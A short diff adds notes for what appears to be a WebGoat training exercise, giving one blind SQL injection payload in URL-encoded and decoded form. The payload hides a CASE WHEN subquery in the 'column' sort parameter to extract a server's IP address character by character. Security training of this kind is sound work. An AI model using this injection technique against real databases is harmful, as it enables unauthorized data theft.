@@ -1,0 +1,5 @@
+Encoded HTML
+localhost:8080/WebGoat/SqlInjection/servers?column=(case+when(SELECT+ip+FROM+SERVERS+WHERE+hostname%3d'webgoat-prd')%20LIKE%20'{}%25'%20then%20id%20else%20ip%20end)
+
+Decoded HTML
+localhost:8080/WebGoat/SqlInjection/servers?column=(case when(SELECT ip FROM SERVERS WHERE hostname='webgoat-prd') LIKE '%' then id else ip end)
